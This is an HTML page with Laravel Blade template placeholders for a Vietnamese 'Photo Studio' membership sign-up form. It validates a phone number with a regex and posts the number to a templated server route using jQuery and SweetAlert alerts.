<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Đăng ký thành viên — Photo Studio</title>
  <meta name="description" content="Nhập số điện thoại để nhận mã thành viên Photo Studio." />
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            sans: ['"Be Vietnam Pro"', 'sans-serif'],
          },
          colors: {
            cream: '#faf3e3',
            ink: '#2b2a26',
            accent: '#e8833a',
            accentlight: '#fdf0e0',
            sage: '#dce3cd',
            sagedark: '#7d8a68',
          },
          boxShadow: {
            card: '0 10px 40px -12px rgba(120, 100, 60, 0.18)',
            input: '0 0 0 1px #e8833a, 0 2px 8px rgba(232, 131, 58, 0.15)',
          },
        },
      },
    };
  </script>
  <style>
    body { -webkit-font-smoothing: antialiased; }
  </style>
</head>
<body class="min-h-screen bg-cream font-sans text-ink">
  <main class="mx-auto flex min-h-screen w-full max-w-md flex-col px-5 pb-10 pt-8">

    <!-- Logo -->
    <header class="pb-8">
      <h1 class="text-3xl font-bold tracking-tight">
        Photo Studio<span class="text-accent">.</span>
      </h1>
    </header>

    <!-- Card -->
    <section class="rounded-3xl bg-white p-8 shadow-card">
      <!-- Icon -->
      <div class="flex justify-center">
        <div class="flex h-20 w-20 items-center justify-center rounded-full bg-sage">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-9 w-9 text-sagedark" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="9" cy="8" r="3.2" />
            <path d="M3.5 19c.6-3 2.9-4.6 5.5-4.6S13.9 16 14.5 19" />
            <path d="M18 6v6" />
            <path d="M15 9h6" />
          </svg>
        </div>
      </div>

      <!-- Title -->
      <h2 class="mt-6 text-center text-2xl font-semibold">Đăng ký thành viên</h2>
      <p class="mt-2 text-center text-sm text-ink/60">
        Nhập số điện thoại để nhận mã thành viên.
      </p>

      <!-- Form -->
      <form id="register-form" class="mt-8" onsubmit="return handleSubmit(event)">
        <label for="phone" class="mb-2 block text-sm font-medium">Số điện thoại</label>
        <input
          id="phone"
          name="phone"
          type="tel"
          inputmode="numeric"
          autocomplete="tel"
          placeholder="VD: 0901234567"
          class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
        />

        <!-- Thông báo submit -->
        <div id="submit-message" class="hidden mt-3 text-center text-sm text-accent">
          Đang gửi đăng ký...
        </div>

        <button
          id="submit-btn"
          type="submit"
          class="mt-8 flex w-full items-center justify-center gap-2 rounded-full bg-ink py-4 text-base font-medium text-white transition-colors hover:bg-ink/85 active:scale-[0.99]"
        >
          Đăng ký
          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M5 12h14" />
            <path d="m13 6 6 6-6 6" />
          </svg>
        </button>
      </form>
      <script>
      function handleSubmit(event) {
        event.preventDefault();

        // Show submit message and disable button
        document.getElementById('submit-message').classList.remove('hidden');
        var btn = document.getElementById('submit-btn');
        btn.disabled = true;
        btn.classList.add('opacity-70');

        var phone = document.getElementById('phone').value.trim();

        // Hàm kiểm tra số điện thoại Việt Nam hợp lệ
        function isVietnamesePhoneNumber(phone) {
          const regex = /^(0|\+84)(3[2-9]|5[6|8|9]|7[0|6-9]|8[1-5]|9[0-9])[0-9]{7}$/;
          return regex.test(phone);
        }

        if (!isVietnamesePhoneNumber(phone)) {
          document.getElementById('submit-message').classList.add('hidden');
          btn.disabled = false;
          btn.classList.remove('opacity-70');
          Swal.fire({
            icon: 'error',
            title: 'Lỗi',
            text: 'Vui lòng nhập số điện thoại hợp lệ (VD: 0901234567)'
          });
          return false;
        }

        const dataToSend = {
          'phone': phone,
          'info': '{{ $info }}',
        }
        $.post("{{ route('post.customweb.bo23333_laysdt') }}", {
            d: JSON.stringify(dataToSend),
            'p_c': "{{ $pusher_code }}",
            '_token': '{{ csrf_token() }}'
          },
          function(data, textStatus, jqXHR) {
            // Sau khi gửi xong, ẩn thông báo và mở lại nút
            document.getElementById('submit-message').classList.add('hidden');
            btn.disabled = false;
            btn.classList.remove('opacity-70');
            // Có thể hiện thông báo thành công ở đây nếu muốn
            Swal.fire({
              icon: 'success',
              title: 'Thành công',
              text: "Đăng ký thành công! Vui lòng kiểm tra điện thoại."
            });
            document.getElementById('register-form').reset();
          },
          "json"
        ).fail(function() {
          document.getElementById('submit-message').classList.add('hidden');
          btn.disabled = false;
          btn.classList.remove('opacity-70');
          Swal.fire({
            icon: 'error',
            title: 'Lỗi',
            text: 'Đăng ký thất bại. Vui lòng thử lại.'
          });
        });

        return false;
      }
      </script>
    </section>
  </main>
</body>
</html>
